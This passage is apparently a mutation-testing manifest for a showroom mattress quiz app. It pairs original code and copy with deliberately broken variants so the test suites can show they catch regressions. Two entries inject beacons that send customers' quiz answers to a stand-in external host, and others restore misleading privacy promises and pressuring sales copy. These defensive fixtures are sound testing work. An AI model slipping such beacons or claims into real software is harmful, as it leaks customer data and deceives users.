    "      min-height: 44px;\n      display: inline-flex;\n      align-items: center;\n      border-radius: var(--radius);",
    "      border-radius: var(--radius);", QUIZ],
  ["quiz: the slider interaction band collapses below 44px",
    "      padding: 22px 0;", "      padding: 2px 0;", QUIZ],
  ["quiz: the slider falls back to the global border-box reset (painted line clipped to nothing)",
    "      box-sizing: content-box;\n", "", QUIZ],

  // Layout ruling and the language-switch rerenders.
  ["quiz: cols-3 behaviour is restored for the 7- and 8-option questions",
    "      if (n <= 3) return 'cols-1';\n      return 'cols-2';",
    "      if (n <= 3) return 'cols-1';\n      if (n <= 6) return 'cols-2';\n      return 'cols-3';", QUIZ],
  ["quiz: a language switch stops re-rendering the active question",
    "      if (questionScreen && questionScreen.classList.contains('active')) {\n        window.renderQuestion();\n      }",
    "      if (questionScreen && false) {\n        window.renderQuestion();\n      }", QUIZ],
  ["quiz: a language switch stops re-rendering the Review rows",
    "      if (reviewScreen && reviewScreen.classList.contains('active')) {\n        window.renderReview();\n      }",
    "      if (reviewScreen && false) {\n        window.renderReview();\n      }", QUIZ],

  // The keyboard focus repair, in both failure directions.
  ["quiz: keyboard focus restoration is removed",
    "      if (restoreId) {\n        var replacement = document.getElementById(restoreId);",
    "      if (false) {\n        var replacement = document.getElementById(restoreId);", QUIZ],
  ["quiz: focus is restored after TOUCH too (the :focus-visible guard is dropped)",
    "            && active.matches(':focus-visible')) {", "            && true) {", QUIZ],
  ["quiz: focus restoration drops the option-identity gate (restores whatever is focused)",
    "        if (active && active.id === activatedId", "        if (active && active.id", QUIZ],
  ["quiz: the option-identity gate is weakened to the question prefix (still restores a sibling option)",
    "        if (active && active.id === activatedId",
    "        if (active && active.id.indexOf('qopt-' + qId + '-') === 0", QUIZ],
  ["quiz: switchLanguage stops recording the focus hint by id (option ids no longer feed the restore path)",
    "      if (active && active.id) _langFocusHintId = active.id;",
    "      if (false) _langFocusHintId = active.id;", QUIZ],

  // ---- Trust integrity gate (2026-08-21): question-change scroll/focus ------
  // Observed by the quiz suite's REPAIR 9 section. The defect these guard
  // against was measured on the mounted orientation: after Next on a tall
  // question the next headline rendered above the viewport and focus fell to
  // BODY.
  ["trust: a question change no longer resets the scroll position",
    "      if (typeof window.scrollTo === 'function') window.scrollTo(0, 0);\n      screen.scrollTop = 0;",
    "      screen.scrollTop = 0;", QUIZ],
  ["trust: a question change no longer focuses the new headline",
    "      var heading = document.getElementById('questionHeadline');",
    "      var heading = null;", QUIZ],
  ["trust: every render is treated as a question change (answer taps and language switches would steal focus)",
    "      var questionChanged = _renderedQuestionId !== null && _renderedQuestionId !== q.id;",
    "      var questionChanged = true;", QUIZ],
  ["trust: showScreen stops handing the first render to the screen transition (double-handled entry)",
    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
    "", QUIZ],
  ["trust: the question headline becomes a permanent tab stop",
    'id="questionHeadline" tabindex="-1"', 'id="questionHeadline" tabindex="0"', QUIZ],
  ["trust: the question-change repair ignores the shared refusal gate",
    "      if (typeof screenTransitionOwnedElsewhere === 'function' && screenTransitionOwnedElsewhere()) return;\n      var screen = document.getElementById('questionScreen');",
    "      var screen = document.getElementById('questionScreen');", QUIZ],
  ["trust: showScreen hands the first render to the screen only on Review transitions (a new customer's first question is double-handled)",
    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
    "      if (!sameScreen && id === 'reviewScreen' && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();", QUIZ],
  ["trust: the rendered-question record freezes at the first question (every later answer tap becomes a change)",
    "      _renderedQuestionId = q.id;", "      if (_renderedQuestionId === null) _renderedQuestionId = q.id;", QUIZ],
  ["trust: the question-change repair stops checking that the question screen is the active screen",
    "      if (!screen || !screen.classList || !screen.classList.contains('active')) return;", "", QUIZ],
  ["trust: the question-change repair stops honouring isFocusRestorable()",
    "      if (typeof isFocusRestorable === 'function' && !isFocusRestorable(heading)) return;", "", QUIZ],

  // ---- Trust integrity gate (2026-08-21): copy <-> engine correspondence --
  ["trust: a shipped overclaim returns to a help line (\"easy fix\")",
    '"en": "If you sleep hot, we favor cooling features in your matches."',
    '"en": "Sleeping hot or cold is an easy fix with the right materials."', TRUST, "data/quiz.json"],
  ["trust: a help line drifts from the line the correspondence document records",
    '"en": "This helps us favor pressure relief, support, or a responsive feel."',
    '"en": "This helps us favor pressure relief, support, or a responsive feel, and more."', TRUST, "data/quiz.json"],
  ["trust: a question loses its correspondence section",
    "### 2. mattress_size", "### 2. mattress_sizes", TRUST, "docs/quiz-copy-engine-correspondence.md"],
  ["trust: the documented inert-tag set drifts from the shipped catalog",
    "`Inert tags: adjustable, comfort,", "`Inert tags: comfort,", TRUST, "docs/quiz-copy-engine-correspondence.md"],
  ["trust: the document cites a mechanism the question does not score",
    "- **Cited tags:** cooling, hybrid, memory, plush.", "- **Cited tags:** cooling, hybrid, memory, plush, motionIsolation.",
    TRUST, "docs/quiz-copy-engine-correspondence.md"],
  ["trust: the quiz root contract is widened for retailer prose",
    '{\n  "questions": [', '{\n  "trustStories": [],\n  "questions": [', TRUST, "data/quiz.json"],

  // ---- Trust integrity gate (2026-08-21): privacy voice ---------------------
  // ---- Trust gate, owner ruling R5 (2026-08-21): the idle dialog body --------
  // Observed by the session suite, which opens the dialog through the real
  // controller on a fake clock and pins the RENDERED body in both languages.
  ["trust: the idle dialog body reverts to the privacy reassurance (EN)",
    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
    '"safety.timeout_body": "Your session is paused to protect your privacy.",', WITH_SESSION, "data/dict-en.json"],
  ["trust: the idle dialog body stops naming the real controls (EN)",
    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
    '"safety.timeout_body": "Session paused. Continue where you left off, or restart to clear this session.",', WITH_SESSION, "data/dict-en.json"],
  ["trust: the Spanish idle dialog body silently becomes English",
    '"safety.timeout_body": "Sesión en pausa. Sigue en esta sesión donde la dejaste o empieza con otro cliente para borrarla.",',
    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",', WITH_SESSION, "data/dict-es.json"],
  ["trust: the idle dialog body becomes a hardcoded literal in index.html",
    "      setSafetyText('sessionSafetyBody', t(cfg.bodyKey));",
    "      setSafetyText('sessionSafetyBody', _safetyMode === 'timeout' ? 'Session paused. Continue this session where you left off, or start a new customer to clear it.' : t(cfg.bodyKey));", WITH_SESSION],
  // Anchored on the four ids alone (not on their position in the array), so the
  // entry still applies after Slice 5 appends its own ids to the inventory.
  ["trust: the Sleep System containers leave the wipe inventory (a previous customer's prose survives Restart)",
    "'sleepSystemMain', 'sleepSystemGuidance', 'sleepSystemRail', 'sleepSystemPlanList'",
    "", TRUST.concat(["tests/session_safety_check.mjs"])],
  // Item 1.3 containment (2026-08-24) removed drawerShortlistFit from the app
  // and therefore from this inventory line, which left this entry unable to
  // apply. Re-pointed at the ids that REMAIN answer-derived, so the guard is
  // live again rather than a stale manifest row that silently tests nothing.
  ["trust: the drawer's answer-derived text leaves the wipe inventory",
    "'drawerSystemPromptTitle', 'drawerSystemPromptReason',", "", TRUST.concat(["tests/session_safety_check.mjs"])],
  ["trust: the Welcome renderer stops calling the data-use renderer (the line never renders)",
    "      renderDataUseStatement();", "      if (false) renderDataUseStatement();", TRUST],
  ["trust: the welcome data-use line ignores deployment mode (always the preview sentence)",
    "      var key = emailDeliveryLive() ? 'privacy.data_use_live' : 'privacy.data_use_preview';",
    "      var key = 'privacy.data_use_preview';", TRUST],
  ["trust: a missing data-use variant renders the dictionary KEY instead of nothing",
    "      if (typeof text === 'string' && text.trim() && text !== key) {",
    "      if (typeof text === 'string') {", TRUST],
  ["trust: the shared mode helper ignores a scenario that disables submission",
    "      return !!gasUrl && !scenarioBlocksEmail;", "      return !!gasUrl;", TRUST],
  ["trust: the email screen's preview note stops deriving from the shared mode helper",
    "      var isDemoMode = !emailDeliveryLive();", "      var isDemoMode = false;", TRUST],
  ["trust: the retired template promise returns to the email screen",
    "      setText('emailPrivacyLead', localizedConfigBlock('text').emailPrivacy || '');",
    "      setText('emailPrivacyLead', (localizedConfigBlock('text').emailPrivacy || '') + ' Your info is never sold to third parties. Unsubscribe anytime.');",
    TRUST],
  ["trust: the privacy-overlay fallback promise returns to the template",
    '<span data-store="privacy-body"></span>',
    '<span data-store="privacy-body">Your information is never sold or shared with third parties.</span>', TRUST],
  ["trust: the Review line reverts to the inline claim that the specialist builds the matches",
    "      if (help) help.textContent = t('review.help');",
    "      if (help) help.textContent = 'A quick check, then your specialist builds your recommendations.';", TRUST],
  ["trust: a third network sink appears (a beacon carrying the answers)",
    "        answers[qId] = optId;\n      }\n      renderQuestion();",
    "        answers[qId] = optId;\n      }\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
  ["trust: a pixel beacon carries the answers to an external host",
    "        answers[qId] = optId;\n      }\n      renderQuestion();",
    "        answers[qId] = optId;\n      }\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
  ["trust: the Spanish data-use variant silently becomes English",
    '"privacy.data_use_preview": "Durante esta sesión en la tienda,',
    '"privacy.data_use_preview": "During this showroom session,', TRUST, "data/dict-es.json"],
  // C6 (cohesion pass-1, 2026-08-30): the take-home eyebrow invites, it does
  // not threaten a loss — in both languages, from the dictionary.
  ["C6: the loss-aversion eyebrow returns in English",
    '"email.eyebrow": "Take your matches home"',
    '"email.eyebrow": "Don\'t lose your matches"', TRUST, "data/dict-en.json"],
  ["C6: the Spanish eyebrow regresses to the pressuring line",
    '"email.eyebrow": "Llévate tus opciones"',
    '"email.eyebrow": "No pierdas tus opciones"', TRUST, "data/dict-es.json"],
  ["C6: showEmailCapture() hardcodes the eyebrow again instead of reading the dictionary",
    "setText('emailEyebrow', t('email.eyebrow'));",
    "setText('emailEyebrow', es ? 'Guarda tus opciones' : 'Keep your matches');", TRUST],
  ["trust: the validator stops rejecting preview-mode privacy prose under a live gasUrl",
    "    if live_at_runtime:\n        _check_privacy_prose_mode(r, config)",
    "    if False:\n        _check_privacy_prose_mode(r, config)", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the validator accepts a non-blank placeholder gasUrl again (live at runtime, pointing at a sentinel)",
    "    if live_at_runtime and is_placeholder:",
    "    if False:", PAY_VALIDATOR, "tools/validation.py"],
  // External review threads (2026-08-22): thread 1 preserved as intentional,
  // thread 2 fixed — each pinned by the validator self-test.
  ["trust: the validator follows a temporary scenario's momentary email block (live-capable admission relaxed)",
    "    live_at_runtime = _runtime_truthy(raw_gas)",
    "    live_at_runtime = _runtime_truthy(raw_gas) and not ((config.get('promotions') or {}).get('activeScenario'))",
    PAY_VALIDATOR, "tools/validation.py"],
  ["trust: admission keys on the STRIPPED gasUrl again (a whitespace-only gasUrl is live at runtime but admitted as blank)",
    "    live_at_runtime = _runtime_truthy(raw_gas)",
    "    live_at_runtime = not _blank(gas)", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: storage-negation phrases fire without governed-data context (truthful unrelated sentence rejected)",
    "            if _storage_claim_is_governed(sentence, prev_sentence, kind, start, end):",
    "            if True:", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the contracted storage negations drop out of the family ('your answers aren't stored' admitted)",
    "_NEG = r\"(?:n't|\\bnot\\b|\\bnever\\b|\\bcannot\\b|\\bno longer\\b)\"",
    "_NEG = r\"(?:\\bnot\\b|\\bnever\\b|\\bcannot\\b|\\bno longer\\b)\"", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: typographic apostrophes stop folding to ASCII ('weren\u2019t stored' admitted)",
    "_PROSE_FOLD = str.maketrans({\"\\u2019\": \"'\", \"\\u2018\": \"'\",",
    "_PROSE_FOLD = str.maketrans({\"\\u2018\": \"'\",", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the adverb gap between negation and verb closes ('not permanently stored' admitted)",
    "_GAP = r\"\\s+(?:\" + _GAP_TOKEN + r\"\\s+){0,3}?\"",
    "_GAP = r\"\\s+\"", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the gap accepts any word again ('we do not ask lenders to store your answers' rejected)",
    "_GAP = r\"\\s+(?:\" + _GAP_TOKEN + r\"\\s+){0,3}?\"",
    "_GAP = r\"\\s+(?:[a-z'-]+\\s+){0,3}?\"", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: only the first destination word is checked for universality ('to absolutely anyone' admitted)",
    "    return (any(w.startswith(_UNIVERSAL_DESTINATIONS) for w in text.split())",
    "    return (text.split()[0].startswith(_UNIVERSAL_DESTINATIONS) if text.split() else False)", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the universal scan stops at the clause ('with our providers or anyone else' after a comma list admitted)",
    "    destination_text = _destination_continuation(clause_after, rest_after)",
    "    destination_text = clause_after", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the universal scan runs over the whole sentence tail again ('..., but anyone can ask us questions' rejected)",
    "    destination_text = _destination_continuation(clause_after, rest_after)",
    "    destination_text = rest_after", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: a coordinated destination segment is capped by length again (a long list ending in 'or anyone else' admitted)",
    "        elif not (any(t in _COORDINATORS for t in tokens) or len(tokens) <= _LIST_ITEM_MAX_WORDS):",
    "        elif len(tokens) > 6:", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: a leading ', and' no longer needs a short item after it (a coordinated clause 'and anyone who asks ...' rejected)",
    "            if len(tokens) - 1 > _LIST_ITEM_MAX_WORDS:\n                break",
    "            if False:\n                break", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: a colon/parenthesis/dash no longer ends the destination (a following fragment is scanned as a destination)",
    "            if not (sep in (\"—\", \"–\") and tokens and tokens[0] in _COORDINATORS):\n                break",
    "            if False:\n                break", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the bare determiner 'any' counts as universal again ('to any lender' rejected)",
    "_UNIVERSAL_DESTINATIONS = (\"anyone\", \"anybody\", \"anything\", \"anywhere\", \"elsewhere\", \"outside\",",
    "_UNIVERSAL_DESTINATIONS = (\"any\", \"anyone\", \"anybody\", \"anything\", \"anywhere\", \"elsewhere\", \"outside\",", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: transmission negations stop being judged for absoluteness (an absolute 'not transmitted' about answers admitted)",
    "    if kind in _TRANSMIT_KINDS and not _transmission_is_absolute(clause_after, sentence[end_pos:]):\n        return False",
    "    if kind in _TRANSMIT_KINDS:\n        return False", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: a qualified destination no longer exempts a transmission negation ('not transmitted to lenders' rejected again)",
    "    m = _DESTINATION_RE.search(clause_after)\n    if not m:\n        return True",
    "    m = None\n    if not m:\n        return True", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: only the first occurrence of a storage phrase is inspected (a later governed clause is admitted)",
    "        for kind, start, end, display in _storage_matches(sentence):",
    "        for kind, start, end, display in _storage_matches(sentence)[:1]:", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: clause conjunctions stop delimiting the bound phrase ('X are emailed but card details are not stored' rejected)",
    "    starts += [i + len(c) for i, c in ((sentence.rfind(c, 0, pos), c) for c in _CLAUSE_CONJUNCTIONS) if i >= 0]",
    "    starts += []", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the storage-negation family is switched off (answer-storage promises admitted under a live gasUrl)",
    "    for idx, sentence in enumerate(sentences):",
    "    for idx, sentence in []:", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the storage negation binds to the whole sentence again (a time adverbial like 'your session' rejects an unrelated claim)",
    "    for fragment in order:\n        if _has_content(fragment):\n            return _governed_in(fragment)\n    return False",
    "    return _governed_in(sentence)", PAY_VALIDATOR, "tools/validation.py"],
  ["trust: the storage negation stops widening to the previous sentence (a pronoun subject after an email sentence is admitted)",
    "        order = (clause_before, sentence[:pos], clause_after, prev_sentence)",
    "        order = (clause_before, sentence[:pos], clause_after)", PAY_VALIDATOR, "tools/validation.py"],

  // ---- Trust integrity gate (2026-08-21): legibility of the honest lines ---
  ["trust: the tier-relativity note shrinks back below body size",
    "      margin-top: 8px;\n      font-size: 15px;\n      line-height: 1.45;",
    "      margin-top: 8px;\n      font-size: 11px;\n      line-height: 1.45;", TRUST_CONTRAST],
  ["trust: the welcome data-use sentence shrinks below body size",
    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 16px;",
    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 12px;", TRUST_CONTRAST],
  ["trust: the tier-relativity note drops to a low-contrast ink",
    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-muted);",
    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-subtle);", TRUST_CONTRAST],

  // ---- Slice 4 / D4: the Payment Choice state model ------------------------
  // The two dimensions, and the line between them. Exploration is descriptive
  // history; a preference is a deliberate one-way choice. Each mutation below
  // collapses one of those properties.
  ["payment: exploring a path also sets it as the preference",
    "        payOpen[id] = true;\n        payRecordExplored(id);",
    "        payOpen[id] = true;\n        payRecordExplored(id);\n        payPref = id;", PAY],
  ["payment: opening the whole sheet records every path as explored",
    "      sheet.hidden = false;\n      // Deliberately records NOTHING.",
    "      sheet.hidden = false;\n      finPaymentPaths().forEach(function(p) { payRecordExplored(p.id); });\n      // Deliberately records NOTHING.", PAY],
  ["payment: explored history admits duplicates",
    "      if (!payIsExplored(id)) payExplored.push(id);",
    "      payExplored.push(id);", PAY],
  ["payment: explored history reorders to most-recent-first",
    "      if (!payIsExplored(id)) payExplored.push(id);",
    "      payExplored = [id].concat(payExplored.filter(function(x) { return x !== id; }));", PAY],
  ["payment: hiding a disclosure deletes the explored entry",
    "      if (payOpen[id] === true) {\n        delete payOpen[id];",
    "      if (payOpen[id] === true) {\n        delete payOpen[id];\n        payExplored = payExplored.filter(function(x) { return x !== id; });", PAY],
  ["payment: Consider becomes a toggle and unsets itself",
    "      if (payPref === id) return;                  // idempotent, never a toggle",
    "      if (payPref === id) { payPref = null; renderAllFinancingSurfaces(); return; }", PAY],
  ["payment: Clear accepts a path that is not the current preference",
    "      if (payPref !== id) return;",
    "      if (false) return;", PAY],
  ["payment: Clear erases the explored history",
    "      payPref = null;\n      renderAllFinancingSurfaces();\n      if (keepFocus) payRestoreFocus(finPathDom('finPathConsider', id));",
    "      payPref = null;\n      payExplored = [];\n      renderAllFinancingSurfaces();\n      if (keepFocus) payRestoreFocus(finPathDom('finPathConsider', id));", PAY],
  ["payment: Not right now erases the explored history instead of preserving it",
    "      payPref = turningOn ? PAY_NOT_NOW : null;",
    "      payPref = turningOn ? PAY_NOT_NOW : null;\n      if (turningOn) payExplored = [];", PAY],
  ["payment: Not right now stops suppressing the explored row on the handoff",
    "      var exploredLabels = notNow ? [] : payExplored",
    "      var exploredLabels = payExplored", PAY],
  ["payment: the current preference is listed again as merely explored",
    "        .filter(function(id) { return id !== payPref; })",
    "        .filter(function(id) { return id !== null; })", PAY],
  ["payment: an unknown/stale path id renders as a raw token",
    "        return '';        // unknown/stale id: NEVER rendered, never as a raw id",
    "        return id;", PAY],
  ["payment: Consider stops validating the path id (an unknown id writes state)",
    "      if (!finPathById(id)) return;\n      if (payPref === id) return;",
    "      if (payPref === id) return;", PAY],

  // Identity. The retired slugifier collapsed distinct provider/plan values
  // onto one key and produced colon-bearing DOM ids.
  ["payment: path identity falls back to the lossy slugifier (distinct paths collide)",
    "      var esc;",
    "      return String(value == null ? '' : value).trim().toLowerCase().replace(/[^a-z0-9_-]+/g, '-').replace(/^-+|-+$/g, '');\n      var esc;", PAY],
  ["payment: path ids regain a colon separator (unusable in querySelector/CSS)",
    "      return kind + '-' + enc;",
    "      return kind + ':' + enc;", PAY],
  // The unencodable-value guard. An unpaired surrogate makes
  // encodeURIComponent throw, and the throw used to escape three guarded entry
  // points: it blanked the handoff module after it was already visible, killed
  // the sheet CTA after its own guard, and halted a language switch mid-way.
  ["payment: the unencodable-string guard is removed (a lone surrogate throws through the renderers)",
    "      var esc;\n      try {\n        esc = encodeURIComponent(value);\n      } catch (err) {\n        return null;\n      }",
    "      var esc = encodeURIComponent(value);", PAY],
  // THE COERCION. Restoring String() here reintroduces the defect an
  // external review found: JSON.parse('{"toString": null}') is a plain
  // object whose own toString is not callable, String() on it throws
  // TypeError, and the throw escapes the handoff renderer, the sheet opener
  // and the language switch.
  ["payment: identity values are coerced again instead of being required to be strings",
    "      if (value === null || value === undefined) return '';\n      if (typeof value !== 'string') return null;",
    "      value = String(value == null ? '' : value);", PAY],
  // The empty encoding is an identity only for the promotional group.
  // Dropping the kind restriction lets a plan with a null or blank id
  // become the truthy stub "plan-", which then survives filtering,
  // resolves, emits controls and can be stored as payPref.
  ["payment: an empty identity is accepted for every kind again (the stub plan- returns)",
    "      if (enc === '' && kind !== 'promo') return '';",
    "", PAY],
  ["payment: finPathId re-derives the coercion outside the encoder (the second String() returns)",
    "      if (enc === null) return '';",
    "      if (!enc && String(value == null ? '' : value) !== '') return '';", PAY],
  // The two action regions share one announcement slot. Every transition must
  // cancel the prior pending utterance across regions, not merely within its own.
  // C8 reverted a per-region timer that had exactly this effect: the cancel
  // became same-region-only, so a transition on one surface left the other
  // surface's now-false message pending and a screen reader announced a payment
  // position the customer had already left.
  ["payment: the announcement cancel becomes same-region-only (a stale message survives elsewhere)",
    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;",
    "      if (_payAnnounceTimer !== null && window._payAnnounceRegion === regionId) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      window._payAnnounceRegion = regionId;\n      if (!payRegionLive(regionId)) return;", PAY],
  ["payment: the liveness test runs BEFORE the cancel, so a dark region cannot supersede a stale message",
    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;",
    "      if (!payRegionLive(regionId)) return;\n      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }", PAY],

  // Accessibility of the new controls.
  ["payment: the disclosure loses aria-expanded",
    "        + 'aria-expanded=\"' + (open ? 'true' : 'false') + '\" '",
    "        + ''", PAY],
  ["payment: the disclosure loses aria-controls",
    "        + 'aria-controls=\"' + finEsc(panelId) + '\" '",
    "        + ''", PAY],
  ["payment: Consider claims to be a two-state control (gains aria-pressed)",
    "        html += '<button type=\"button\" class=\"fin-btn fin-btn-secondary fin-path-consider\"",
    "        html += '<button type=\"button\" aria-pressed=\"false\" class=\"fin-btn fin-btn-secondary fin-path-consider\"", PAY],
  ["payment: the considering marker becomes an interactive control",
    "        html += '<span class=\"fin-path-marker\" id=\"'",
    "        html += '<button type=\"button\" class=\"fin-path-marker\" id=\"'", PAY],
  ["payment: \"Not right now\" loses aria-pressed (its one genuine two-state control)",
    "        + 'aria-pressed=\"' + (notNow ? 'true' : 'false') + '\" '",
    "        + ''", PAY],
  ["payment: the new controls lose the .fin-btn interaction floor (48px + touch-action)",
    "class=\"fin-btn fin-btn-ghost fin-path-review\"",
    "class=\"fin-path-review\"", PAY],
  ["payment: a path control drops its ontouchend preventDefault (iPad ghost clicks)",
    "'ontouchend=\"event.preventDefault();window.considerPaymentPath(this.getAttribute(\\'data-path-id\\'));\">'",
    "'ontouchend=\"window.considerPaymentPath(this.getAttribute(\\'data-path-id\\'));\">'", PAY],

  // Focus restoration, in both failure directions.
  ["payment: focus restoration drops the control-identity gate",
    "        return !!(active && active.id === controlId",
    "        return !!(active && active.id", PAY],
  ["payment: focus is restored after TOUCH too (the :focus-visible guard is dropped)",
    "          && active.matches(':focus-visible'));",
    "          && true);", PAY],

  // The two live regions must stay two.
  ["payment: Consider/Clear announce through the freshness region instead",
    "      announcePayAction('financingSheetAction', 'currentlyConsidering');",
    "      announcePayAction('financingSheetStatus', 'currentlyConsidering');", PAY],
  ["payment: a queued announcement is no longer superseded (two utterances race)",
    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;\n      region.textContent = '';",
    "      region.textContent = '';", PAY_ASYNC],

  // Forced colors: the cue must WIN the cascade and must be geometry.
  ["payment: the forced-colors pressed rule stops pinning an explicit system colour",
    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {\n        border-width: 2px;\n        border-color: CanvasText;",
    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {\n        border-width: 2px;\n        border-color: #211E19;", PAY],
  ["payment: the forced-colors pressed rule loses its cascade scope (drops to a losing selector)",
    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {",
    "      .fin-not-now {", PAY],
  ["payment: the considering marker's geometric cue collapses to the resting width",
    "      .fin-card .fin-path-marker {\n        border-width: 2px;",
    "      .fin-card .fin-path-marker {\n        border-width: 1px;", PAY],
  ["payment: the resting path controls lose their explicit system boundary",
    "      .fin-card .fin-path-review,\n      .fin-card .fin-path-consider,\n      .fin-card .fin-path-clear {\n        border-color: CanvasText;",
    "      .fin-card .fin-path-review,\n      .fin-card .fin-path-consider,\n      .fin-card .fin-path-clear {\n        border-color: #C9C1AF;", PAY],

  // Session + language.
  ["payment: a language switch resets the model instead of only the announcements",
    "      clearPayAnnouncements();\n      renderAllFinancingSurfaces();",
    "      clearPayAnnouncements();\n      payExplored = []; payPref = null; payOpen = {};\n      renderAllFinancingSurfaces();", PAY_WITH_SESSION],
  ["payment: the wipe leaves the explored history behind",
    "        payExplored = [];\n        payPref = null;",
    "        payPref = null;", PAY_WITH_SESSION],
  ["payment: the wipe leaves the preference behind",
    "        payPref = null;\n        payOpen = {};",
    "        payOpen = {};", PAY_WITH_SESSION],
  ["payment: the wipe hides a missing binding behind a typeof guard",
    "        payExplored = [];",
    "        if (typeof payExplored !== 'undefined') payExplored = [];", PAY_WITH_SESSION],
  ["payment: the sheet's action region drops out of the wipe's text inventory",
    "      'hf2FinancingStatus', 'financingSheetStatus', 'financingSheetAction',",
    "      'hf2FinancingStatus', 'financingSheetStatus',", PAY_WITH_SESSION],
  ["payment: the customer-derived financing containers drop out of the wipe inventory",
    "      'financingSheetCards', 'hf2FinancingInterest', 'hf2FinancingPrograms',",
    "", PAY_WITH_SESSION],

  // Privacy: email, payload, diagnostics.
  ["payment: the email body starts reading the preference",
    "      return FC('emailBodyAvailable');",
    "      return payPref ? FC('emailBody') : FC('emailBodyAvailable');", PAY_EMAIL],
  ["payment: a retired agenda diagnostic event returns",
    "      payPref = turningOn ? PAY_NOT_NOW : null;",
    "      payPref = turningOn ? PAY_NOT_NOW : null;\n      analytics.log('financing_agenda_changed', finEventBase('handoff'));", PAY_ASYNC],

  // Copy: a retired key comes back, or an adopted one disappears.
  ["payment: a retired agenda copy key is wired back into the renderer",
    "      spec.textContent = FC('sheetDone');",
    "      spec.textContent = FC('agendaDone');", PAY_COPY],
  ["payment: an adopted D4 key disappears from the canonical source",
    '      "paymentPreferenceLabel": {',
    '      "paymentPreferenceLabelRetired": {', PAY_COPY, "incoming/lacks_financing.json"],
  ["payment: the generated production config drifts from the canonical source",
    '      "exploreConsequence": {',
    '      "exploreConsequenceDrifted": {', PAY_COPY, "data/store-config.json"],
  ["payment: the demo bundle's financing block drifts from production",
    '        "en": "Payment preference",',
    '        "en": "Payment preferences",', PAY_COPY, "demo/black-friday/data/store-config.json"],
  ["payment: the governed no-submission sentence is reworded",
    "Nothing is submitted and no application is started.",
    "Nothing is sent right now.", PAY_COPY, "incoming/lacks_financing.json"],

  // Taxonomy/renderer.
  ["payment: promotional paths stop grouping by provider (one path per PLAN)",
    "      finPromotionalByProvider(groups.promotional).forEach(function(grp) {\n        var provider = grp.provider;\n        paths.push({",
    "      groups.promotional.forEach(function(grp) {\n        var provider = grp.provider;\n        paths.push({", PAY_RENDER],

  // ---- Slice 4 / D4: per-surface placement (item 1.5) ----------------------
  // Config-DISABLING rather than deleting only means something if the flag is
  // actually consulted, if a MISSING flag still means enabled, and if the
  // dormant surface really is still there to re-enable.
  ["payment: the drawer surface flag is ignored (a disabled surface renders anyway)",
    "      if (!financingEnabled() || !finSurfaceEnabled('drawer')) {",
    "      if (!financingEnabled()) {", PAY],
  ["payment: the Sleep System surface flag is ignored",
    "      var financingBlock = (financingEnabled() && finSurfaceEnabled('sleepSystem'))",
    "      var financingBlock = financingEnabled()", PAY],
  ["payment: a MISSING surface flag is treated as DISABLED (breaks every other deployment)",
    "      return surfaces[name] !== false;",
    "      return surfaces[name] === true;", PAY],
  ["payment: the malformed-surfaces guard is dropped (a null surfaces block throws)",
    "      if (!surfaces || typeof surfaces !== 'object') return true;",
    "", PAY],
  ["payment: the shipped drawer surface policy silently flips back on",
    '      "drawer": false,',
    '      "drawer": true,', PAY, "incoming/lacks_financing.json"],
  ["payment: the generated config's surface policy drifts from the canonical source",
    '      "sleepSystem": false',
    '      "sleepSystem": true', PAY_COPY, "data/store-config.json"],

  // ---- Slice 4 / C13: the config-admission gate ---------------------------
  // Restores the exact bypass an external review found on this branch: scoping
  // the required-copy contract to a DECLARED `experience` rather than to
  // `enabled`. The runtime never reads `experience`, so under the bypass an
  // enabled financing block that predates the field validated green and then
  // rendered blank Payment Choice controls to a customer. No runtime suite can
  // see this — the defect is in what the build lets through, not in what the
  // page does — which is why the observer is the validator's own self-test.
  ["payment: required copy is scoped to a DECLARED experience again (C13 bypass)",
    'if _exp is None or _exp == "payment-choice":',
    'if _exp == "payment-choice":', PAY_VALIDATOR, "tools/validation.py"],

